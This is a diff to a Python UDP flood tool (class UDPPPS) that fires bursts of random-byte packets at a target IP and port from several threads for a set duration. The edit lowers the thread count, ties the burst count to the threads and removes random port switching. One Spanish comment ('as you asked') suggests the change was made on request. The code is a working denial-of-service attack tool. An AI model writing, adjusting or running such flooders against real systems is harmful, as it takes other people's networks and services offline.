@@ -8,7 +8,6 @@ class UDPPPS:
     def __init__(self, ip, port, threads, stop_event=None):
         self.ip = ip
         self.port = port
-        self.packet_size = 1024
         self.threads = threads
         self.stop_event = stop_event
         self.on = False
@@ -37,23 +36,18 @@ class UDPPPS:
             if self.stop_event and self.stop_event.is_set():
                 break
             try:
-                # Reduce burst y tamaño de paquete
                 packet_size = random.choice([512, 1024, 2048])
                 data = os.urandom(packet_size)
-                dest_port = self.port
-                if random.random() > 0.85:
-                    dest_port = random.randint(1, 65535)
-                burst_count = random.randint(3, 10)
+                burst_count = self.threads  # 5 bursts igual a los threads
                 for _ in range(burst_count):
                     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    s.sendto(data, (self.ip, dest_port))
+                    s.sendto(data, (self.ip, self.port))
                     s.close()
-                # Agrega un pequeño sleep para no saturar la CPU
                 time.sleep(0.01)
             except Exception:
                 pass
 
 def run(ip, port, duration, stop_event):
-    # Baja a 20 threads por defecto
-    attacker = UDPPPS(ip, port, threads=20, stop_event=stop_event)
+    # Solo 5 threads como pediste
+    attacker = UDPPPS(ip, port, threads=5, stop_event=stop_event)
     attacker.flood(duration)
